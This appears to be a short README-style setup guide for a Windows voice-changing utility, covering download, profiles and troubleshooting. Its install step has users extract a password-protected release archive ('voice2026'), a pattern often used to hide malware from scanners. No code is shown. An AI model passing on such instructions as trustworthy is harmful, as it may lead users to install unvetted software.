Follow these steps to set up the software on your computer.

  2. Download the file: Click the latest release zip file to save it to your computer.
  3. Extract the archive: Locate the file in your downloads folder. Use a tool like WinRAR or 7-Zip to open it. Enter the password voice2026 when prompted.

⚙️ Managing Profiles

You can create custom voice profiles for different activities. If you play games, create a profile that removes keyboard clicks. If you record podcasts, create a profile that boosts tone and clarity. Use the Save button in the main window to keep these settings for future use.

⚠️ Troubleshooting

If you do not hear audio changes, check your Windows sound settings. Make sure the software has access to your microphone. Check that you selected the utility as the input device inside your target application. Restart the software if the audio output stops. This tool operates at a low level within your system to ensure speed, so avoid closing the main window while you use it.
